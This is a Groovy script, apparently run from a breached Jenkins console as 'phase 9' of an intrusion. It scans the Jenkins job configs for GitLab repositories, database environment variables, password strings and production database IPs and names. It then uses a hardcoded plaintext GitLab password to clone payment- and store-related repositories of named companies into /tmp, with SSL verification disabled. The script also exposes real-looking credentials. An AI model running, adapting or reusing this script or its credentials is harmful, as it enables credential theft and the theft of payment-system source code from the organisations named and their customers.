// PHASE 9: Find USERVAR_* actual values in Jenkins jobs + read mrc-services jobs
// Also: find all job names + list all repos via Jenkins job configs

// ===== PART 1: List all Jenkins job names and find git URLs =====
println "=== PART 1: ALL JENKINS JOBS WITH GITLAB REPOS ==="
def jobsDir = new File("/var/jenkins_home/jobs")
def allJobs = []

jobsDir.eachFileRecurse { f ->
    if (f.name != "config.xml") return
    def text = f.text
    def jobName = f.parentFile.parentFile.name
    
    // Extract git repo URLs
    def urls = []
    (text =~ /url.*?gitlab[^<'"]{3,200}/).each { m -> 
        def u = m.toString().replaceAll(/^url.*?['">]/, "").replaceAll(/['">].*$/, "")
        if (u.contains("gitlab") && u.length() > 15) urls << u.trim()
    }
    (text =~ /<url>([^<]*gitlab[^<]+)<\/url>/).each { m -> urls << m[1] }
    
    if (urls) allJobs << [name: jobName, path: f.absolutePath, urls: urls.unique()]
}

println "  Total jobs with GitLab: ${allJobs.size()}"
allJobs.sort { it.name }.each { j ->
    println "  ${j.name}: ${j.urls.join(' | ')}"
}

// ===== PART 2: Find USERVAR_DB values in job configs =====
println "\n=== PART 2: USERVAR_DB_* ACTUAL VALUES ==="
def dbVarJobs = []
jobsDir.eachFileRecurse { f ->
    if (f.name != "config.xml") return
    def text = f.text
    // Look for env blocks with USERVAR_DB values
    if (!text.contains("USERVAR_DB")) return
    
    def jobPath = f.absolutePath
    def jobName = f.parentFile.parentFile.name
    
    // Extract <string>KEY=VALUE</string> patterns from withEnv blocks
    def envVars = [:]
    (text =~ /<string>(USERVAR_[A-Z_]+=([^<]+))<\/string>/).each { m ->
        envVars[m[1].split("=")[0]] = m[1].split("=",2)[1]
    }
    (text =~ /USERVAR_([A-Z_]+)['"]*\s*[,=:]\s*['"]([^'"<]{3,100})['"]/).each { m ->
        envVars["USERVAR_${m[1]}"] = m[2]
    }
    
    if (envVars) {
        println "\n  JOB: ${jobName} (${jobPath.replace('/var/jenkins_home/jobs/','')})"
        envVars.each { k, v -> println "    ${k}=${v}" }
        dbVarJobs << [name: jobName, vars: envVars]
    }
}

// ===== PART 3: Read mrc-services job configs (Sears PROD jobs) =====
println "\n=== PART 3: JOB CONFIGS REFERENCING mrc-services ==="
jobsDir.eachFileRecurse { f ->
    if (f.name != "config.xml") return
    def text = f.text
    if (!text.contains("mrc-services")) return
    
    def jobName = f.parentFile.parentFile.name
    def fullPath = f.absolutePath.replace('/var/jenkins_home/jobs/', '')
    
    // Extract full job structure
    println "\n  ====== ${fullPath} ======"
    
    // Get git URLs
    (text =~ /<url>([^<]+)<\/url>/).each { m -> println "  GIT: ${m[1]}" }
    
    // Get environment variables (withEnv blocks)
    (text =~ /<string>(USERVAR_[^<]{3,200})<\/string>/).each { m -> println "  ENV: ${m[1].take(200)}" }
    
    // Get all defaultValues
    (text =~ /<defaultValue>([^<]+)<\/defaultValue>/).each { m ->
        def v = m[1].trim()
        if (v.length() > 2 && !v.startsWith("master")) println "  DEFAULT: ${v.take(150)}"
    }
    
    // Look for pipeline script inline
    if (text.contains("172.27.141") || text.contains("dbasears") || text.contains("payment_t1")) {
        (text =~ /(?s)<script>(.{500,5000}?)<\/script>/).each { m ->
            println "  SCRIPT: ${m[1].take(1000)}"
        }
    }
}

// ===== PART 4: Search ALL jobs for prod DB references =====
println "\n=== PART 4: PROD DB CREDENTIALS IN JOB ENVS ==="
def prodKeywords = ["172.27.141.4", "172.27.141.6", "172.27.141.24", 
                    "dbasears", "apifincadob", "payment_t1", "app_t1",
                    "wUt22Us2CUh", "mrc-services.io"]
jobsDir.eachFileRecurse { f ->
    if (f.name != "config.xml") return
    def text = f.text
    def matches = prodKeywords.findAll { k -> text.contains(k) }
    if (!matches) return
    
    def fullPath = f.absolutePath.replace('/var/jenkins_home/jobs/', '')
    println "\n  ${fullPath} -> refs: ${matches}"
    
    // Extract all string params
    (text =~ /<string>([^<]{5,500})<\/string>/).each { m ->
        def s = m[1].trim()
        if (matches.any { k -> s.contains(k) } || s.contains("PASS") || 
            s.contains("password") || s.contains("DB_") || s.contains("USERVAR_")) {
            println "    STRING: ${s.take(300)}"
        }
    }
}

// ===== PART 5: Clone t1pagos and sears repos via varied paths =====
println "\n=== PART 5: ENUM MORE REPO PATHS ==="
def user = "jenkins"
def pass = "e6LBqIkOI\$PR1XX2oia"
def passEnc = java.net.URLEncoder.encode(pass, "UTF-8")
def DEST_BASE = "/tmp/glr_"
def cloneBase = "https://${user}:${passEnc}@gitlab.dev.claroshop.com"

// From job configs, extract actual GitLab paths
def gitPaths = [] as Set
jobsDir.eachFileRecurse { f ->
    if (f.name != "config.xml") return
    def text = f.text
    (text =~ /gitlab\.dev\.claroshop\.com\/([a-zA-Z0-9_\-\/]+?)(?:\.git|')/).each { m ->
        def p = m[1].trim()
        if (p.length() > 3) gitPaths << p
    }
    (text =~ /<url>http[s]?:\/\/gitlab\.dev\.claroshop\.com\/([a-zA-Z0-9_\-\/]+?)(?:\.git)?<\/url>/).each { m ->
        gitPaths << m[1].trim()
    }
}

println "  FOUND ${gitPaths.size()} UNIQUE GITLAB PATHS IN JOBS:"
gitPaths.sort().each { println "    ${it}" }

// Clone the most relevant ones
def toClone = gitPaths.findAll { p ->
    def keywords = ["caja", "payment", "pago", "sears", "t1", "monedero", "tienda", "tarjet", "claropay"]
    keywords.any { k -> p.toLowerCase().contains(k) }
}

println "\n  CLONING ${toClone.size()} RELEVANT REPOS:"
toClone.each { path ->
    def dest = DEST_BASE + path.replace('/', '__')
    def fDest = new File(dest)
    if (fDest.exists() && fDest.list()?.length > 2) {
        println "  CACHED: ${path}"
        return
    }
    try { ["bash","-c","rm -rf '${dest}'"].execute().waitFor() } catch(e) {}
    def cloneUrl = "${cloneBase}/${path}.git"
    def pb = ["bash","-c","GIT_TERMINAL_PROMPT=0 GIT_SSL_NO_VERIFY=1 git clone --depth=1 '${cloneUrl}' '${dest}'"]
    def proc = pb.execute()
    def errOut = new StringBuilder()
    proc.consumeProcessErrorStream(errOut)
    proc.waitForOrKill(30000)
    def ok = fDest.exists() && (fDest.list()?.length?:0) > 1
    if (ok) println "  CLONED: ${path} -> ${fDest.list()?.join(',')?.take(80)}"
    else println "  FAIL: ${path} - ${errOut.toString().take(80)}"
}

println "\n=== DONE PHASE 9 ==="
